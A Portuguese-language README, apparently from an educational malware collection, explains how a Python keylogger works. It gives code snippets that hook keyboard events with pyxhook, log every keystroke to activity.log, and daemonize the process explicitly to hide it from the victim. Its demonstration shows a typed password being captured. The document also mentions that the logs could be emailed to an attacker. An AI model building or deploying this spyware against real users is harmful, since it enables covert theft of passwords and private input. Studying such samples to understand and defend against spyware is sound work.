# Spyware

Existem muitas maneiras de espionar a vítima. Nosso **spyware** é representado pelo **keylogger**, um programa simples que monitora as teclas pressionadas no teclado e pode ver tudo o que você digita. Este **keylogger** é implementado no arquivo `keylogger.py`.

#### Demonstração de comportamento

Não precisamos de nenhuma preparação específica antes da execução do keylogger (`./keylogger.py`). Podemos observar que após a execução nada aconteceu e podemos digitar novos comandos, assim como no caso de pressionarmos apenas a tecla `Enter`. Agora você pode fazer em seu sistema o que quiser. Para a demonstração, você pode abrir um navegador e digitar algo como `Passwd` representando sua senha em potencial, assim como faria em qualquer página de login de sua mídia social.

Agora você pode ver que na mesma pasta que nosso **keylogger** está localizado um novo arquivo `activity.log`. Observando o arquivo você pode ver que ele contém todas as teclas que você pressionou em seu teclado após a execução, incluindo sua senha `Passwd`. O invasor pode acessar facilmente esses arquivos e modificar o keylogger para enviá-los em um endereço de e-mail específico ou com uma combinação de diferentes tipos de malware, ele pode obter acesso direto a eles via rede.

```
Key: P
Key: a
Key: s
Key: s
Key: w
Key: d
```

A criação do **keylogger** é um processo muito simples, conforme descrito abaixo e qualquer pessoa pode fazê-lo apenas com um conhecimento básico de programação e compreensão de sistemas operacionais. É por isso que devemos ser sempre cuidadosos quando executamos qualquer arquivo incomum ou não confiável.

#### Como funciona?

 - Em primeiro lugar, configuramos nosso logger. Podemos especificar o arquivo no qual devem ser armazenados os dados, bem como o formato da mensagem.
   ```python
   logging.basicConfig(
       level=logging.DEBUG,
       filename='activity.log',
       format='Key: %(message)s',
   )
   ```
 - Então temos que obter o manipulador do arquivo de log. Explicaremos o porquê no próximo passo.
   ```python
   handler = logging.getLogger().handlers[0].stream
   ```
 - Para tornar nosso spyware mais difícil de ser detectado pela vítima, queremos que ele seja executado em segundo plano como um **daemon**.
   Para saber mais sobre daemons, consulte [o guia de daemons](https://kb.iu.edu/d/aiau). Para este propósito nós
   usará um módulo Python padrão `daemon` que nos permitirá daemonizar nosso **keylogger**.
   Quando o daemon for criado, perderemos conexões com todos os manipuladores de arquivos como `stdout` ou mesmo
   nosso arquivo de log, a menos que especifiquemos que os arquivos devem ser preservados. Por isso obtivemos
   manipulador de arquivo de log na etapa anterior. No contexto do nosso daemon oculto, agora podemos criar o
   keylogger e inicie sua atividade.
   ```python
   # Daemonize the process to hide it from the victim.
   with daemon.DaemonContext(files_preserve=[handler]):
       # Create keylogger.
       keylogger = Keylogger('SimpleSpyware')
       # Start logging activity of the user.
       keylogger.start_logging()
   ```
  - Para obter os _key press events_ podemos usar um módulo python para Linux chamado `pyxhook`. Se nós
    criaria um keylogger para Windows, devemos usar o módulo `pyHook`, mas sua interface é
    muito parecido. Criamos um **gerenciador de ganchos**, que gerenciará o tratamento de eventos e nos permitirá
    definir um retorno de chamada para esses eventos. Callback é no nosso caso uma função que será chamada cada vez que um novo
    evento é obtido (__keydown_callback_). A única coisa que esse método faz é registrar a chave em nosso
    arquivo especificado `activity.log`.
    ```python
    hook_manager = pyxhook.HookManager()
    # Assign callback for handling key strokes.
    hook_manager.KeyDown = self._keydown_callback
    # Hook the keyboard and start logging.
    hook_manager.HookKeyboard()
    hook_manager.start()
    ```

